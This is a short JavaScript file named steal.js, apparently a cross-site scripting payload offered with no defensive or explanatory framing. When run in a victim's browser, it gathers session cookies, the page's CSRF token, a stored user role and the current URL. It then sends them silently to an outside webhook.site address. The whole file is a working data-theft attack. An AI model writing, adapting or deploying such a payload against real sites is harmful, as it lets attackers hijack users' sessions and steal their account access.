// steal.js - Collects and sends data
(function() {
    const data = {
        cookies: document.cookie,
        csrf: document.querySelector('meta[name="csrf-token"]')?.content || 'No CSRF token found',
        user_role: sessionStorage.getItem('user_role') || localStorage.getItem('user_role') || 'No role found',
        url: window.location.href
    };

    console.log('📊 Collected Data:', data);

    // Send to webhook
    fetch('https://webhook.site/a85315b7-2be0-4070-b137-a3bda5f1ab12', {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    });
})();